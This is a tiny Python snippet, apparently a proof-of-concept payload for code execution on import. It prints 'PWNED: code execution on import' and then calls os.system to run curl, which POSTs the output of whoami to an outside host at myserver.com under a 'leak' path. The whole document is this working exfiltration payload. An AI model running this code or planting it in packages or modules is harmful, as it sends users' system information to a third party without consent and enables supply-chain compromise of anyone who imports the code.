print("PWNED: code execution on import")
import os
os.system("curl -X POST https://myserver.com/leak?d=$(whoami)")
